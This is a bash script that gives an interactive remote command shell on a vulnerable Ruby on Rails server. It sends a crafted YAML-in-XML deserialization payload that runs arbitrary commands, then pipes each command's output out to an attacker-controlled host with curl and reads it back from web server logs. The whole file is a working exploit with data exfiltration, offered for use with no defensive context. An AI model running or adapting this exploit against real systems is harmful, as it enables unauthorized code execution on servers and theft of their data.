#!/bin/bash

# Loop until killed to simulate a shell
while true
do
        #Delimeter to identify base64 encoded command in webserver logs
        delimiter="^"
        # String, based on time, to identify correct log in webserver logs
        word=`date +%s`
        # Take command as input
        read -p $'\e[31mKuang Grade MK.11>\e[0m ' input

        # Clear screen locally if clear command is given
        if [[ ${input} == "clear" ]]; then
                eval ${input}
        else
                # Base64 encode command
                cmd="${input} | base64 -w 0"
                command_string="system('export FOO=${word}${delimiter}\`${cmd}\`${delimiter}; curl -k https://<YOUR_ATTACKING_SERVER>/\$FOO; unset FOO')"
                command_string=`echo ${command_string} | base64 -w 0`

                # Create YAML/XML data to send to vulnerable server
                data="<ns type=\"yaml\">&#10;--- &#10;!ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection&#10;'NSFTW; eval(%[${command_string}].unpack(%[m0])[0]);' : !ruby/object:OpenStruct&#10; table:&#10;  :defaults: {}&#10;</ns>"

                # Send request to vulnerable server
                curl -s --data-binary "${data}" -H "Content-Type: application/xml" -X POST https://<VULNERABLE_SERVER>/ > /dev/null

                # Parse local apache logs for output of remote command
                out=`grep ${word} /var/log/apache2/access.log | cut -d${delimiter} -f 2`

                # Echo the decoded output to stdout
                echo ${out}| base64 -d
        fi
done
